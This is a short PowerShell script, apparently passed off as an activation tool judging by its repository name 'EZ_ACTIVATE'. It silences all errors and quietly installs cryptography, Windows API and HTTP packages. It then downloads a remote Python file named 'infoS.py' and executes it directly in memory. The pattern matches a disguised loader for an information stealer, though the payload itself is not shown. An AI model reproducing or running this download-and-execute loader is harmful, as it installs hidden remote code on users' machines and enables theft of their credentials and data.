$ErrorActionPreference = 'SilentlyContinue'
try { python --version >$null 2>&1 } catch { 
    Write-Host "⚠️ Install Python first: https://python.org"
    exit 
}
python -m pip install --upgrade pip >$null 2>&1
python -m pip install pycryptodome pypiwin32 requests >$null 2>&1
$code = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py")
python -c $code
